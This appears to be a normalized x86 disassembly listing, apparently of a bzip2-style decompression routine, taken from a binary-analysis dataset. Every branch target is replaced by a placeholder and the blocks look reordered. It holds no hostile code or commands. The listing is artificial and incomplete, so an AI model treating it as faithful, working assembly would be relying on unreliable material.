shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x39
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp al 0x31
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x2c ]
cmp [ ebx + 0x30 ] 0x2
mov eax [ ebx + 0x2c ]
jl r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
add ecx 0xa
cmp eax ecx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x100
lea eax [ ebx + 0xc6c ]
push 0x0
push eax
call sub_10011a90
add esp 0xc
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
shl eax 0x4
add eax ebx
mov [ eax + ecx + 0xc6c ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x6
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov al [ ebp - 0x1c ]
inc [ ebp - 0x10 ]
mov [ ebx + ecx + 0x650e ] al
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ ebp - 0x34 ]
inc [ ebp - 0x34 ]
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
imul eax eax 0x102
mov cl [ ebp - 0x34 ]
add eax ebx
inc [ ebp - 0x10 ]
mov [ eax + edx + 0xab60 ] cl
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x48 ]
shl ecx 0x2
cmp eax [ ecx + edx ]
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebx + 0xc5c ] 0x0
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10010789
leave
retn
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
add eax 0xffffffd0
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x24 ] eax
push 0x1
je r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebx + 0xc58 ] 0x0
push eax
push r--data
call sub_10013458
add eax 0x40
push eax
call sub_1001360d
add esp 0xc
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
and [ ebp - 0x10 ] 0x0
jmp r-xdata
inc [ eax + 0xc ]
mov eax [ ebp - 0x10 ]
cmp eax 0x10
jge r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x10 ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov edx [ ebp - 0x50 ]
cmp [ ebp - 0x10 ] edx
jge r-xdata
inc [ eax + 0xc ]
jmp r-xdata
xor edi edi
xor cl cl
cmp [ ebp - 0x44 ] edi
jle r-xdata
and [ ebp - 0x1c ] 0x0
inc [ eax + 0xc ]
cmp [ ebp - 0x34 ] 0x14
jg r-xdata
cmp [ ebp - 0x34 ] 0x1
jl r-xdata
inc [ eax + 0xc ]
inc [ ebp - 0x3c ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
mov ecx [ ebp - 0x40 ]
sub eax [ ecx + esi * 4 ]
js r-xdata
inc esi
mov [ ebp - 0x14 ] esi
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ ebp - 0x14 ]
mov edx [ ebp - 0x40 ]
sub eax [ ecx + edx ]
jmp r-xdata
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
inc [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ ebx + 0xfa14 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebx + 0xfa18 ] ecx
mov ecx [ ebp - 0x3c ]
mov [ ebx + 0xfa1c ] ecx
mov ecx [ ebp - 0x60 ]
mov [ ebx + 0xfa20 ] ecx
mov ecx [ ebp - 0x44 ]
mov [ ebx + 0xfa24 ] ecx
mov ecx [ ebp - 0x50 ]
mov [ ebx + 0xfa28 ] ecx
mov ecx [ ebp - 0x64 ]
mov [ ebx + 0xfa2c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0xfa30 ] ecx
mov ecx [ ebp - 0x28 ]
mov [ ebx + 0xfa34 ] ecx
mov ecx [ ebp - 0x54 ]
mov [ ebx + 0xfa38 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ ebx + 0xfa3c ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebx + 0xfa40 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ ebx + 0xfa44 ] ecx
mov ecx [ ebp - 0x74 ]
mov [ ebx + 0xfa48 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ ebx + 0xfa4c ] ecx
mov ecx [ ebp - 0x80 ]
mov [ ebx + 0xfa50 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0xfa54 ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebx + 0xfa58 ] ecx
mov ecx [ ebp - 0x6c ]
mov [ ebx + 0xfa5c ] ecx
mov ecx [ ebp - 0x70 ]
mov [ ebx + 0xfa60 ] ecx
mov ecx [ ebp - 0x5c ]
mov [ ebx + 0xfa64 ] ecx
mov ecx [ ebp - 0x48 ]
mov [ ebx + 0xfa68 ] ecx
mov ecx [ ebp - 0x40 ]
mov [ ebx + 0xfa6c ] ecx
mov ecx [ ebp - 0x4c ]
mov [ ebx + 0xfa70 ] ecx
jmp r-xdata
imul eax eax 0x61a80
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
mov [ ebx + 0xc4c ] eax
jmp r-xdata
imul eax eax 0x30d40
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
mov [ ebx + 0xc50 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
inc eax
push 0x1
sar eax 0x1
push eax
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0x18
cmp [ ebx + 0xc50 ] 0x0
mov [ ebx + 0xc54 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x10
jl r-xdata
and [ ebx + 0xc68 ] 0x0
xor eax eax
cmp [ ebx + eax + 0xd6c ] 0x0
je r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
jle r-xdata
xor eax eax
mov eax [ ebp - 0x44 ]
and [ ebp - 0x3c ] 0x0
test eax eax
jle r-xdata
cmp eax 0x102
jge r-xdata
cmp eax 0x102
jge r-xdata
js r-xdata
test eax eax
jne r-xdata
push 0xfffffffd
inc eax
cmp eax 0x100
jl r-xdata
mov ecx [ ebx + 0xc68 ]
mov [ ebx + ecx + 0xd7c ] al
inc [ ebx + 0xc68 ]
and [ ebp - 0x1c ] 0x0
jmp r-xdata
and [ ebp - 0x3c ] 0x0
jmp r-xdata
mov dl [ ebx + edi + 0x650e ]
movzx eax dl
lea eax [ ebp + eax - 0xc ]
mov cl [ eax ]
test dl dl
jbe r-xdata
mov [ ebp + eax - 0xc ] cl
inc cl
movzx eax cl
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov eax [ ebx + 0xc68 ]
and [ ebp - 0x28 ] 0x0
inc eax
mov [ ebp - 0x64 ] eax
mov eax [ ebx + 0x24 ]
imul eax eax 0x186a0
mov edx 0x100
mov [ ebp - 0x30 ] eax
xor eax eax
lea edi [ ebx + 0x40 ]
mov ecx edx
[ edi ]
push 0xf
mov [ ebp - 0x10 ] edx
mov esi 0xfff
pop eax
lea edi [ ebx + 0x1eb8 ]
lea ecx [ ebx + 0xab60 ]
lea edi [ ebx + 0xf9fc ]
lea edx [ ebx + 0xc99c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x4c ]
mov eax [ ecx + eax * 4 ]
xor edx edx
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
cmp [ eax + ebx + 0xc6c ] 0x0
je r-xdata
mov eax [ ebx + 0xc68 ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x10
jl r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
mov [ ebx + edi + 0x1ebc ] cl
inc edi
cmp edi [ ebp - 0x50 ]
mov [ ebp - 0xc ] cl
jl r-xdata
mov esi eax
mov dl [ ebp - 0x24 ]
add dl cl
mov [ ebx + esi + 0xe7c ] dl
dec esi
dec [ ebp - 0x24 ]
jns r-xdata
lea ecx [ esi + 0x1 ]
mov [ edi ] ecx
dec eax
sub edi 0x4
test eax eax
jge r-xdata
push [ ebp - 0x60 ]
lea eax [ edx + 0x1830 ]
push [ ebp - 0x24 ]
push esi
push eax
lea eax [ edx - 0x1830 ]
push eax
mov eax [ ebp - 0x30 ]
call sub_1000f89b
add [ ebp - 0x30 ] 0x102
mov [ edi ] esi
add esp 0x14
add edi 0x4
add edx 0x408
dec [ ebp - 0x64 ]
jne r-xdata
mov ecx [ ebp - 0x30 ]
movzx eax [ ecx + eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jl r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x74 ]
cmp eax 0x200000
jge r-xdata
cmp eax 0x1
je r-xdata
add eax 0x2
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x10 ] edi
mov al [ esi - 0x1 ]
dec dl
mov [ esi ] al
dec esi
test dl dl
ja r-xdata
mov cl al
mov [ ebp - 0x24 ] 0xf
shl cl 0x4
xor eax eax
cmp [ ebp - 0x50 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
xor eax eax
cmp [ ebp - 0x60 ] eax
push 0x20
pop esi
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] eax
jle r-xdata
cmp eax esi
jge r-xdata
mov [ ebp - 0x24 ] eax
cmp eax [ ebp - 0x18 ]
jge r-xdata
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x74 ] 0x1
cmp edi 0x1
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1e7c ]
movzx eax [ eax + ebx + 0xe7c ]
mov cl [ eax + ebx + 0xd7c ]
inc [ ebp - 0x20 ]
mov esi [ ebp - 0x20 ]
movzx eax cl
add [ ebx + eax * 4 + 0x40 ] esi
cmp [ ebx + 0x28 ] dl
je r-xdata
movzx eax [ ebx + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
lea edx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] edx
lea edx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] 0x31
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x10 ]
inc eax
cmp eax [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
jl r-xdata
mov esi eax
and [ ebp - 0x10 ] 0x0
lea esi [ ebx + 0x40 ]
mov eax esi
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
cmp [ ebp - 0x54 ] 0x1
jne r-xdata
add [ ebp - 0x20 ] eax
jmp r-xdata
cmp [ ebp - 0x20 ] edx
jle r-xdata
cmp esi edx
jle r-xdata
cmp ecx [ ebp - 0x18 ]
jg r-xdata
dec edi
cmp edi 0x10
jae r-xdata
add eax eax
cmp [ ebp - 0x28 ] 0x0
mov [ ebp - 0x74 ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx + eax * 2 ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp - 0x54 ]
cmp edi [ ebp - 0x64 ]
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] 0xff
jle r-xdata
mov esi edi
shr esi 0x4
lea eax [ ebx + esi * 4 + 0x1e7c ]
mov edx [ eax ]
and edi 0xf
add edi edx
cmp edi edx
mov cl [ ebx + edi + 0xe7c ]
jle r-xdata
mov edx [ ebx + 0x1e7c ]
lea eax [ ebx + edx ]
mov cl [ eax + edi + 0xe7c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x55 ] cl
cmp edi 0x3
jbe r-xdata
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
mov esi [ ebx + 0xc4c ]
mov [ esi + ecx * 4 ] eax
inc ecx
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] ecx
